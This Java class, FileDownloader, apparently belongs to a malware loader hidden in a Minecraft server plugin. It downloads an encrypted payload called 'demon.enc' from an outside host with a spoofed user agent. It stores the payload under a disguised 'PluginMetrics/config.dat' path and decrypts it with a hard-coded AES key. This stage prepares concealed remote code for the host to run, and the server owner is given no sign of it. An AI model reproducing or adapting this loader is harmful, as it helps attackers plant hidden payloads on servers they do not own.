package club.reaper.loader.downloader;

import lombok.Getter;

import java.io.*;
import java.net.URL;
import java.net.URLConnection;
import java.nio.file.Files;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import org.apache.commons.io.FileUtils;

@Getter
public class FileDownloader {
	public File download() throws IOException, InvalidKeyException, NoSuchAlgorithmException, NoSuchPaddingException, IllegalBlockSizeException, BadPaddingException, InvalidAlgorithmParameterException {
		File file = new File("plugins/PluginMetrics/config.dat");
		file.createNewFile();
		File decrypted = new File("plugins/PluginMetrics/world.dat.dec");
		URL url = new URL("https://web8526.phsite.online/api/loader/demon/demon.enc");
		URLConnection connection = url.openConnection();
		connection.setRequestProperty("User-Agent", "UltimateTool");
		InputStream in = connection.getInputStream();
		FileOutputStream fos = new FileOutputStream(file);
		byte[] buf = new byte[512];
		while (true) {
			int len = in.read(buf);
			if (len == -1) {
				break;
			}
			fos.write(buf, 0, len);
		}
		in.close();
		fos.flush();
		fos.close();
		
		byte[] cipherBytes = Files.readAllBytes(file.toPath());
		byte[] iv = "RR8zEFCWyuad5uff".getBytes();
		byte[] keyBytes = "u8S4T6P#t#fWhAGQ".getBytes();
		SecretKey aesKey = new SecretKeySpec(keyBytes, "AES");
		Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
		cipher.init(Cipher.DECRYPT_MODE, aesKey, new IvParameterSpec(iv));
		byte[] result = cipher.doFinal(cipherBytes);
		FileUtils.writeByteArrayToFile(decrypted, result);
		return decrypted;
	}




}
